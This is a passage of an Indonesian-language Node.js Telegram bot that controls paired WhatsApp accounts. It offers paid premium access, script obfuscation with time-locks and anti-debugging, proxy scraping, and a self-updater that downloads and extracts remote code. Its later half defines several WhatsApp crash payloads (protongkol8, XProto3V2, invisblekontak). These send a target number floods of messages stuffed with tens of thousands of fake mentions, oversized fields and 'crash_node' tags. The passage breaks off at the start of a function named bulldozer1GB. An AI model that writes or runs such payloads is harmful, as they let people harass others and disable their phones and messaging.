⠏⢆⣾⣿⣿⡷⢈⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣿⠃⣿⣿⣿⣿⣿⣿⣿
⠀⣸⣿⣿⠟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⡆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⡙⡇⢿⣿⣿⣿⣿⣿⣿
⢀⣿⢟⡵⣸⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠶⠞⠛⠛⢛⣛⡛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣧⡸⣿⡈⣿⣿⣿⣿⣿⣿
⠘⣡⣿⢣⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣩⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣷⣶⣬⣙⡛⠿⠿⠿⣿⠏⣼⣿⣇⢻⠇⣿⣿⣿⣿⣿⣿
⣼⣿⡇⡜⣼⡄⢹⣿⣿⣿⣿⣿⣿⡿⠋⢵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⠲⠏⢰⣿⣿⣿⠈⣼⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢻⣿⣿⣄⠻⣿⣿⡿⠟⣁⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣼⣿⣿⡏⢠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣗⢸⣿⣿⣯⠃⠈⣉⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⢀⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⢼⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣸⣿⣿⣿⣯⢸⣿⣿⣿⣿⣿⣿⣯
⣿⣿⣿⣾⣿⣿⣿⠂⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢠⣿⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣇⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣼⣿⣿⣿⣿⡗⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡏⢠⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⢨⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢿⣿⣿⣿⠏⣸⣿⣿⣿⣿⣿⣿⣿⣿
`));

  console.log(chalk.bold.blue(`
═════════════════════════
 мαηтα'χ Im Here!
═════════════════════════
`));
};

(async () => {
  await initializeWhatsAppConnections();
  await startBot();
})();

let otax;

function ensureStorageExists() {
  if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
  }

  const sessionFileDir = path.dirname(SESSIONS_FILE);
  if (!fs.existsSync(sessionFileDir)) {
    fs.mkdirSync(sessionFileDir, { recursive: true });
  }

  if (!fs.existsSync(SESSIONS_FILE)) {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));
  }
}

function saveActiveSessions(botNumber) {
  try {
    const sessionFileDir = path.dirname(SESSIONS_FILE);
    if (!fs.existsSync(sessionFileDir)) {
      fs.mkdirSync(sessionFileDir, { recursive: true });
    }

    let sessionsArray = [];

    if (fs.existsSync(SESSIONS_FILE)) {
      try {
        const fileData = fs.readFileSync(SESSIONS_FILE, 'utf-8');
        sessionsArray = JSON.parse(fileData || "[]");
      } catch (parseError) {
        sessionsArray = [];
      }
    }

    if (!sessionsArray.includes(botNumber)) {
      sessionsArray.push(botNumber);
    }

    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsArray));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  try {
    if (!fs.existsSync(deviceDir)) {
      fs.mkdirSync(deviceDir, { recursive: true });
    }
  } catch (error) {
    console.error(`Gagal membuat folder sesi untuk ${botNumber}:`, error);
  }
  return deviceDir;
}

function connectBot(number) {
  console.log("Menghubungkan bot:", number);
}

async function initializeWhatsAppConnections() {
  try {
    ensureStorageExists();

    const fileData = fs.readFileSync(SESSIONS_FILE, 'utf-8');
    let activeNumbers = [];

    try {
      activeNumbers = JSON.parse(fileData || "[]");
    } catch (parseError) {
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));
      activeNumbers = [];
    }

    if (activeNumbers.length > 0) {
      for (const botNumber of activeNumbers) {
        connectBot(botNumber);
      }
    }
  } catch (error) {
    console.error("Error membaca file sesi WhatsApp:", error);
  }
}


async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙎𝙖𝙗𝙖𝙧 𝘿𝙪𝙡𝙪 𝙔𝙖 𝘽𝙖𝙣𝙜  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  otax = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  otax.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙊𝙩𝙞𝙬𝙞 𝘼𝙗𝙖𝙣𝙜𝙠𝙪  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙃𝙚𝙝𝙚 𝙀𝙧𝙧𝙤𝙧 𝘽𝙖𝙣𝙜  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, otax);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝘾𝙞𝙚𝙚 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 ${botNumber} 𝙐𝙬𝙪✘ \`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await otax.requestPairingCode(botNumber, "MANTAXXX");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙈𝙖𝙣𝙩𝙖𝙥𝙨 ദ്ദി ˉ͈̀꒳ˉ͈́ )✧ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙉𝙞𝙝\`\`\`
𝘾𝙤𝙙𝙚 𝘼𝙗𝙖𝙣𝙜𝙠𝙪: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\` (☞ ͡° ͜ʖ ͡°)☞ 𝙂𝙖𝙜𝙖𝙡 𝘽𝙖𝙣𝙜 ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  otax.ev.on("creds.update", saveCreds);

  return otax;
}
async function loadActiveSessions() {
  try {

    const sessionsDir = path.resolve(SESSIONS_DIR);

    try {
      await fs.access(sessionsDir);
    } catch (error) {
      if (error.code === 'ENOENT') {


        console.log(`Direktori "${sessionsDir}" tidak ditemukan.  Mengembalikan sesi kosong.`);
        return {};
      } else {

        console.error("Error saat memeriksa direktori sesi:", error);
        throw error;
      }
    }


    const data = await fs.readFile(SESSIONS_FILE, 'utf8');
    const sessions = JSON.parse(data);

    return sessions || {};

  } catch (error) {
    if (error.code === 'ENOENT') {
      console.log("File sesi tidak ditemukan, mengembalikan sesi kosong.");
      return {};
    }

    console.error("Error membaca daftar sesi aktif:", error);

    return {};
  }
}
async function deleteSession(botNumber) {
  try {

    let sessions = await loadActiveSessions();

    if (sessions && sessions.hasOwnProperty(botNumber)) {
      delete sessions[botNumber];

      await saveActiveSessions(sessions);
      console.log(`Entri sesi untuk ${botNumber} dihapus.`);
    } else {
      console.log(`Entri sesi untuk ${botNumber} tidak ditemukan.`);
    }


    try {
      await fs.unlink(SESSIONS_FILE);
      console.log(`File sesi "${SESSIONS_FILE}" berhasil dihapus.`);
    } catch (unlinkError) {
      if (unlinkError.code === 'ENOENT') {
        console.log(`File sesi "${SESSIONS_FILE}" tidak ditemukan. Mungkin sudah dihapus.`);
      } else {
        console.error(`Error menghapus file sesi "${SESSIONS_FILE}":`, unlinkError);
      }
    }

    return true;

  } catch (error) {
    console.error(`Error dalam deleteSession untuk ${botNumber}:`, error);
    return false;
  }
}

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = botLinks.random || defaultLinks.random;
  return images[Math.floor(Math.random() * images.length)];
}

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(u => u.id === userId);

  if (user && !isExpired(user.expiresAt)) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  }
  return "😡 - Tidak ada waktu aktif";
}

async function getWhatsAppChannelInfo(link) {

  if (!link.startsWith("https://whatsapp.com/channel/")) {
    return { error: "Link tidak valid! Harus diawali dengan https://whatsapp.com/channel/" };
  }


  let channelId = link.split("https://whatsapp.com/channel/")[1];


  if (channelId.includes("?")) {
    channelId = channelId.split("?")[0];
  }

  if (!channelId) {
    return { error: "ID Channel tidak ditemukan dalam link." };
  }


  try {
    let res = await otax.newsletterMetadata("invite", channelId);


    if (!res) {
      return { error: "Tidak ada data yang ditemukan untuk channel ini." };
    }


    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification === "VERIFIED" ? "Terverifikasi" : "Tidak"
    };
  } catch (err) {
    console.error("Kesalahan saat mengambil data channel:", err);
    return { error: "Gagal mengambil data channel. Periksa link atau coba lagi nanti." };
  }
}

function isPremiumUser(userId) {
  const user = premiumUsers.find(u => u.id === userId);
  if (!user) return false;

  const now = moment().tz('Asia/Jakarta');
  const exp = moment(user.expiresAt).tz('Asia/Jakarta');

  return now.isBefore(exp);
}

const checkPremium = async (ctx, next) => {
  if (isPremiumUser(ctx.from.id)) {
    await next();
  } else {
    await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @Otapengenkawin untuk upgrade.");
  }
};

const getAphocalypsObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.75,
    deadCode: 0.2,
    dispatcher: true,
    duplicateLiteralsRemoval: true,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "mangled",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.5,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.5,
    rgf: false,
  };
};

const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};

async function updateProgress(bot, chatId, message, percentage, status) {
  if (!bot || !chatId || !message || !message.message_id) {
    console.error("updateProgress: Bot, chatId, atau message tidak valid");
    return;
  }

  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;

  try {
    await bot.editMessageText(
      "```css\n" +
      "🔒 EncryptBot\n" +
      ` ${levelText} (${percentage}%)\n` +
      ` ${bar}\n` +
      "```\n" +
      "_© ᴇɴᴄ ʙᴏᴛ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘_",
      {
        chat_id: chatId,
        message_id: message.message_id,
        parse_mode: "Markdown"
      }
    );
    await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
  } catch (error) {
    console.error("Gagal memperbarui progres:", error.message);
  }
}
const obfuscateTimeLocked = async (fileContent, days) => {
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + parseInt(days));
  const expiryTimestamp = expiryDate.getTime();
  try {
    const obfuscated = await JsConfuser.obfuscate(
      `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
      {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized",
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        controlFlowFlattening: 0.75,
        flatten: true,
        shuffle: true,
        rgf: false,
        opaquePredicates: {
          count: 6,
          complexity: 4
        },
        dispatcher: true,
        globalConcealing: true,
        lock: {
          selfDefending: true,
          antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
          integrity: true,
          tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
        },
        duplicateLiteralsRemoval: true
      }
    );
    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }
    return obfuscatedCode;
  } catch (error) {
    throw new Error(`Gagal obfuscate: ${error.message}`);
  }
};


const AutoUpdater = {
  AU_owner: "OtaStoree",
  AU_repo: "MantaXx",
  AU_ref: "main",
  AU_versionPath: "version.json",
  AU_flagFile: path.join(process.cwd(), ".manta_update.json"),
  AU_localVersion: 0,
  AU_busy: false,

  AU_nowWITA() {
    try {
      return new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar", hour12: false });
    } catch {
      return new Date().toISOString().replace("T", " ").slice(0, 19);
    }
  },

  AU_loadState() {
    try {
      const d = JSON.parse(fs.readFileSync(this.AU_flagFile));
      this.AU_localVersion = d.version || 0;
    } catch { }
  },

  AU_saveState() {
    try {
      fs.writeFileSync(this.AU_flagFile, JSON.stringify({
        version: this.AU_localVersion,
        updated_at: Date.now()
      }));
    } catch { }
  },

  async AU_getRemoteVersion() {
    const url = `https://raw.githubusercontent.com/${this.AU_owner}/${this.AU_repo}/${this.AU_ref}/${this.AU_versionPath}`;
    const res = await axios.get(url, { timeout: 15000 });
    return res.data;
  },

  async AU_downloadZip(url) {
    const res = await axios.get(url, { responseType: "arraybuffer", timeout: 30000 });
    return res.data;
  },

  AU_hasNewDependencies(zip) {
    try {
      const pkgEntry = zip.getEntry("package.json");
      if (!pkgEntry) return false;
      const remotePkg = JSON.parse(pkgEntry.getData().toString());
      const localPkg = fs.existsSync("package.json") ? JSON.parse(fs.readFileSync("package.json", "utf8")) : {};
      const remoteDeps = remotePkg.dependencies || {};
      const localDeps = localPkg.dependencies || {};
      return Object.keys(remoteDeps).some(dep => !localDeps[dep]);
    } catch {
      return false;
    }
  },

  AU_npmInstall() {
    return new Promise((resolve, reject) => {
      exec("npm install --no-audit --no-fund", (err, stdout, stderr) => {
        if (err) return reject(err);
        console.log(stdout);
        resolve();
      });
    });
  },

  async AU_run() {
    if (this.AU_busy) return;
    this.AU_busy = true;

    try {
      this.AU_loadState();
      const remote = await this.AU_getRemoteVersion();
      if (!remote || !remote.version) {
        this.AU_busy = false;
        return;
      }

      if (remote.version === this.AU_localVersion) {
        console.log(`AutoUpdate: versi sudah terbaru (${this.AU_localVersion})`);
        this.AU_busy = false;
        return;
      }

      console.log(`AutoUpdate: update terdeteksi, ${this.AU_localVersion} → ${remote.version}`);
      const zipBuffer = await this.AU_downloadZip(remote.zip_url);
      const zip = new AdmZip(zipBuffer);
      const needInstall = this.AU_hasNewDependencies(zip);

      zip.extractAllTo(process.cwd(), true);
      if (needInstall) {
        console.log("AutoUpdate: dependency baru terdeteksi, menjalankan npm install...");
        await this.AU_npmInstall();
      }

      this.AU_localVersion = remote.version;
      this.AU_saveState();

      console.log(`AutoUpdate: update selesai, versi sekarang ${this.AU_localVersion}`);
      setTimeout(() => process.exit(0), 2000);

    } catch (e) {
      console.error("AutoUpdate: gagal update", e);
    }

    this.AU_busy = false;
  }
};


const nama = "мαηтα'χ";
const author = "мαηтα'χ";

let videoCache = null;
let videoCachePath = null;

function loadVideoToCache() {
  if (videoCache) return videoCache;

  const videoPath = path.join(__dirname, "./assets/videos/video.mp4");
  if (fs.existsSync(videoPath)) {
    videoCachePath = videoPath;
    videoCache = fs.readFileSync(videoPath);
    return videoCache;
  }
  return null;
}

bot.onText(/\/updateproxy/, (msg) => {
  const chatId = msg.chat.id;
  scrapeProxies();
  const message = "Proxy Updated.";
  bot.sendMessage(chatId, message);
});

bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;

  fs.readFile("proxy.txt", "utf8", (err, data) => {
    if (err) {
      bot.sendMessage(
        chatId,
        "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses."
      );
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }


    const proxies = data.split("\n").filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(
      chatId,
      `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`
    );
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});

bot.onText(/\/tt\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const tiktokUrl = match[1].trim();

  // Premium Check
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendMessage(chatId, "❌ Maaf, fitur download TikTok ini hanya tersedia untuk user Premium.");
  }

  if (!tiktokUrl.includes("tiktok.com")) {
    return bot.sendMessage(chatId, "❌ Link TikTok tidak valid.");
  }

  const waitMsg = await bot.sendMessage(chatId, "⏳ Sedang memproses video...");

  try {
    const data = new URLSearchParams();
    data.append('id', tiktokUrl);
    data.append('locale', 'en');
    data.append('tt', 'UVh4Z3Z4');

    const response = await axios.post('https://ssstik.io/abc?url=dl', data.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'hx-current-url': 'https://ssstik.io/en',
        'hx-request': 'true',
        'hx-target': 'target',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
      }
    });

    const html = response.data;
    const downloadLinkMatch = html.match(/href="(https:\/\/tikcdn\.io\/ssstik\/[^"]+)"/);

    if (downloadLinkMatch && downloadLinkMatch[1]) {
      const dlLink = downloadLinkMatch[1];

      const videoRes = await axios.get(dlLink, {
        responseType: 'arraybuffer',
        headers: {
          'Referer': 'https://ssstik.io/',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }
      });

      await bot.sendVideo(chatId, Buffer.from(videoRes.data), {
        caption: "✅ Video berhasil didownload via Manta'X."
      });
      bot.deleteMessage(chatId, waitMsg.message_id).catch(() => { });
    } else {
      bot.editMessageText("❌ Gagal mendapatkan link download. Pastikan link video benar atau coba lagi nanti.", {
        chat_id: chatId,
        message_id: waitMsg.message_id
      });
    }
  } catch (error) {
    console.error("Error TT Download:", error);
    bot.editMessageText(`❌ Error: ${error.message}`, {
      chat_id: chatId,
      message_id: waitMsg.message_id
    });
  }
});

function generateMessageID() {
  return Math.floor(Math.random() * 1e10).toString();
}
async function protongkol8(otax, target, mention) {
  const photo = {
    image: imgCrl,
    caption: "ूाीू𝗣𝗲𝗿𝗺𝗶𝘀𝗶𝗡𝘂𝗺𝗽𝗮𝗻𝗴𝗟𝗲𝘄𝗮𝘁".repeat(30)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 1000,
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: otax.waUploadToServer
  });

  await otax.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: otax.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 1000000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardingScore: 999999,
      isForwarded: true,
      quotedMessage: {
        conversation: "🔥".repeat(500)
      },
      externalAdReply: {
        title: "🔥 𝗞𝗮𝗯𝗼𝗲𝗺",
        body: "✘ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ一緒",
        thumbnailUrl: "https://example.com/image.jpg",
        mediaType: 1,
        mediaUrl: "https://crashforce.loiv",
        sourceUrl: "https://wa.me/0",
        previewType: "PHOTO"
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await otax.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: Array.from({ length: 10 }, () => ({
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          },
          {
            tag: "crash_node",
            attrs: { force: "true" },
            content: ["💥".repeat(100)]
          }
        ]
      }))
    });

    if (mention) {
      await otax.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined
          }
        ]
      });
    }
  }
}
async function XProto3V2(otax, target, mention) {
  const protoMessage = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "𝕷𝖎𝖍𝖃 𝖃𝖛𝖎𝖕" + "🥶".repeat(101),
          height: 10,
          width: 101,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              "99988877766@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [
            {
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "uknown",
                  songId: "870166291800508",
                  author: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝟑" + "᭱".repeat(9999),
                  title: "𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐",
                  artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                  artistAttribution: "https://t.me/FunctionLihX",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                }
              },
              embeddedAction: null
            }
          ]
        }
      }
    }
  }, {});

  await otax.relayMessage("status@broadcast", protoMessage.message, {
    messageId: protoMessage.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  if (mention) {
    await otax.relayMessage(target, {
      groupStatusMentionMessage: {
        message: { protocolMessage: { key: protoMessage.key, type: 25 } }
      }
    }, {
      additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
    });
  }
}
async function invisblekontak(target) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        contactMessage: {
          displayName: "Mamia",
          vcard: `BEGIN:VCARD
VERSION:3.0
FN:Yukina
TEL;type=CELL;type=VOICE;waid=6287878064688:+62 878-7806-4688
END:VCARD`,
          contextInfo: {
            mentionedJid: Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });
}

async function bulldozer1GB(otax, target) {
